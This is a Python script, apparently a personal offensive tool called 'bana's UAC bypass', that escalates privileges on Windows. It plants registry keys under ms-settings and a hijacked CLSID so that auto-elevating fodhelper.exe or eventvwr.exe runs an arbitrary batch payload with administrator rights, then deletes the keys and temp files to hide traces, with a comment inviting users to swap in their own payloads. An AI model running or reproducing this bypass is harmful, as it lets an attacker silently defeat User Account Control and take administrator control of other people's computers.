import os
import ctypes
import winreg
import random
import string
import tempfile
import time
import subprocess
from ctypes import wintypes, byref

kernel32 = ctypes.windll.kernel32 # 이거 다 windows api 핸들들 불러오는거임 | load all these windows api handles
advapi32 = ctypes.windll.advapi32
user32 = ctypes.windll.user32
shell32 = ctypes.windll.shell32

class UACBypass:
    def __init__(self):
        self.reg_keys = []  # 레지스트리 추적 | registry tracking 
        self.temps = []  # 임시파일 추적 | temp file tracking
        
    def rand_name(self, length=12):
        chars = string.ascii_lowercase + string.digits
        return ''.join(random.choice(chars) for _ in range(length))
    
    def make_reg_key(self, key_path): # 레지스트리 키 recursive 생성 | create registry key recursively
        parts = key_path.split('\\') 
        current_path = parts[0]
        
        for part in parts[1:]:
            current_path += '\\' + part
            try:
                key = winreg.CreateKey(winreg.HKEY_CURRENT_USER, current_path)
                winreg.CloseKey(key)
            except WindowsError as e:
                print(f"[!] Failed to create key {current_path}: {e}")
                return False
                
        self.reg_keys.append(key_path)
        return True
    
    def write_reg(self, key_path, value_name, value_data, value_type=winreg.REG_SZ): # 레지스트리 쓰기 | write registry
        try:
            if not self.make_reg_key(key_path):
                return False
                
            key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, key_path, 0, winreg.KEY_WRITE)
            winreg.SetValueEx(key, value_name, 0, value_type, value_data)
            winreg.CloseKey(key)
            return True
        except Exception as e:
            print(f"[!] Failed to write registry {key_path}\\{value_name}: {e}")
            return False
    
    def make_bat(self, command, keep_open=False, delay_seconds=0): # bat 파일 생성 | create bat file
        lines = ["@echo off"]
        if delay_seconds and isinstance(delay_seconds, int) and delay_seconds > 0:
            lines.append(f"timeout /t {delay_seconds} /nobreak >nul")
        lines.append(command)
        if not keep_open:
            lines.append("exit")
        payload_content = "\n".join(lines) + "\n"

        temp_bat = tempfile.NamedTemporaryFile(
            suffix='.bat', 
            delete=False,
            dir=os.getenv('TEMP'),
        )

        with open(temp_bat.name, 'w', encoding='utf-8') as f:
            f.write(payload_content)

        self.temps.append(temp_bat.name)
        return temp_bat.name
    
    def run_admin(self, program, params=None): # 관리자 권한 실행 | run as admin
        try:
            if params is None:
                params = ''
                
            result = shell32.ShellExecuteW(
                None,                   
                "runas",                
                program,                
                params,                 
                None,                   
                1                       
            )
            
            return result > 32
        except Exception as e:
            print(f"[!] ShellExecute failed: {e}")
            return False
    
    def fodhelper(self, payload_command): # fodhelper 우회 | fodhelper bypass
        print("[+] starting UAC bypass")
        
        base_key = "Software\\Classes\\ms-settings"
        command_key = f"{base_key}\\shell\\open\\command"
        delegate_key = f"{command_key}\\DelegateExecute"
        
        try:
            print("[+] setting up registry")
            
            if not self.write_reg(command_key, "DelegateExecute", ""): # delegateexecute 빈값 설정 | set delegateexecute to empty
                print("[!] failed to set DelegateExecute")
                return False
            
            payload_file = self.make_bat(payload_command, keep_open=True)
            
            cmd_line = f'cmd.exe /k "{payload_file}"' # 레지스트리에 페이로드 넣기 | put payload in reg
            if not self.write_reg(command_key, None, cmd_line):
                print("[!] failed to set command")
                return False
            
            print("[+] running Fodhelper")
            fodhelper_path = os.path.join(os.environ['WINDIR'], 'System32', 'fodhelper.exe')
            
            if not self.run_admin(fodhelper_path):
                print("[!] failed to run Fodhelper - trying second method")
                try:
                    subprocess.Popen(fodhelper_path, shell=True)
                except Exception as e:
                    print(f"[!] second method also failed: {e}")
                    return False
            
            print("[+] waiting for execution")
            time.sleep(5)
            
            self.cleanup()
            print("[✓] UAC bypass attempt completed")
            return True
            
        except Exception as e:
            print(f"[!] Bypass failed: {e}")
            self.cleanup()
            return False
    
    def eventvwr(self, payload_command): # com 하이재킹 우회 | com hijack bypass
        print("[+] running second method")
        
        try:
            com_key = "Software\\Classes\\CLSID\\{26A7EC05-7A1B-4E9A-B0A6-3E3107EAE6A7}"
            com_key_inproc = f"{com_key}\\InprocServer32"
            
            payload_file = self.make_bat(payload_command)
            
            self.write_reg(com_key, None, "Elevated Startup Manager") # com 레지스트리 세팅 | com reg setting
            self.write_reg(com_key_inproc, None, payload_file)
            self.write_reg(com_key_inproc, "ThreadingModel", "Both")
            
            eventvwr_path = os.path.join(os.environ['WINDIR'], 'System32', 'eventvwr.exe') # eventvwr 실행하면 권한 올라감 | run eventvwr to elevate
            subprocess.Popen(eventvwr_path, shell=True)
            
            time.sleep(3)
            self.cleanup()
            return True
            
        except Exception as e:
            print(f"[!] second method failed: {e}")
            self.cleanup()
            return False
    
    def cleanup(self): # 정리 clean up
        print("[+] cleaning up")
        
        cleanup_paths = [
            "Software\\Classes\\ms-settings\\shell\\open\\command",
            "Software\\Classes\\ms-settings\\shell\\open", 
            "Software\\Classes\\ms-settings\\shell",
            "Software\\Classes\\ms-settings"
        ]
        
        for path in cleanup_paths:
            try:
                winreg.DeleteKey(winreg.HKEY_CURRENT_USER, path)
            except:
                pass
        
        for temp_file in self.temps:
            try:
                if os.path.exists(temp_file):
                    os.unlink(temp_file)
            except:
                pass
        
        self.reg_keys.clear()
        self.temps.clear()

def main():
    print("""
    bana's UAC bypass - happy UAC!
    """)
    
    bypass = UACBypass()
    
    payloads = [
        "cmd.exe /c echo UAC Bypass Successful by bana && whoami && whoami /groups | findstr /i \"High\" && timeout 10",
        "powershell -Command \"Start-Process cmd.exe -Verb RunAs\"",
        "cmd.exe /k title Administrator && whoami"
    ] # you can change payloads here
    
    print("[+] trying method 1")
    success = bypass.fodhelper(payloads[0])
    
    if not success:
        print("[!] method 1 failed - trying method 2")
        success = bypass.eventvwr(payloads[1])
    
    if success:
        print("[✓] UAC bypass successfully completed!")
        print("[+] check your payload is running")
    else:
        print("[!] All methods failed")

if __name__ == "__main__":
    main()